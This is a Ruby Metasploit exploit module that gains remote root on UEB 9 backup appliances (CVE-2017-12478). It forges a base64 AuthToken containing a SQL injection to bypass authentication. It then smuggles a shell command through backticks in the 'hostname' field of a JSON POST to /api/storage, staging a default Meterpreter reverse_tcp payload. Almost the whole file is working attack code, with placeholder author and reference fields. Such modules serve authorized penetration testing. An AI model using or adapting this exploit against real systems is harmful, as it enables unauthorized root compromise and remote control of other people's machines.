  ##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'openssl'
require 'base64'
require 'uri'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'UEB 9 remote root',
      'Description'    => %q{
        easy auth bypass+RCE
      },
      'Author'         =>
        [
          'aaaaaa@blah.com'
        ],
      'License'        => MSF_LICENSE,
      'Platform'       => 'linux',
      'Arch' => [ARCH_X86],
      'CmdStagerFlavor' => [ 'printf' ],
      'References'     =>
        [
          ['URL', 'http://BLAH'],
          ['CVE', 'CVE-2017-12478'],
        ],
      'Targets'        =>
        [
          [ 'UEB 9.*', { } ]
        ],
      'Privileged'     => true,
      'DefaultOptions' => 
     { 'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp',
       'SSL' => true
    },
      'DisclosureDate'  => 'Aug 8th 2017',
      'DefaultTarget'   => 0))
    register_options(
      [
        Opt::RPORT(443),
      ])
    deregister_options('SRVHOST', 'SRVPORT')
  end

  def filter_bad_chars(cmd)
    cmd.gsub!("\\", "\\\\\\")
    cmd.gsub!("'", '\\"')
  end

  # calls some method to inject cmd to the vulnerable code.
  def execute_command(cmd, opts = {}) 

    session = "v0:b' UNION SELECT -1 -- :1:/usr/bp/logs.dir/gui_root.log:0"                                  
    session = Base64.strict_encode64(session)

    parms = "{\"type\":4,\"name\":\"_Stateless\",\"usage\":\"stateless\",\"build_filesystem\":1,\"properties\":{\"username\":\"aaaa\",\"password\":\"aaaa\",\"hostname\":\"`#{filter_bad_chars(cmd)}` &\",\"port\":\"2049\",\"protocol\":\"nfs\",\"share_name\":\"aaa\"}}"

    res = send_request_cgi({

      'uri' => '/api/storage',
      'method' => 'POST',
      'ctype'  => 'application/json',
      'encode_params' => false,
      'data'   => parms,
      'headers' =>
      {'AuthToken' => session,}
    })

    if res.code == 500
      #print_good("Response looks good")
      #return Exploit::CheckCode::Detected
    else
      print_error("Unexpected response")
    end
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")
  end

  def exploit
    print_status("#{peer} - pwn'ng ueb 9....")
    execute_cmdstager(:linemax => 150)

  end
end
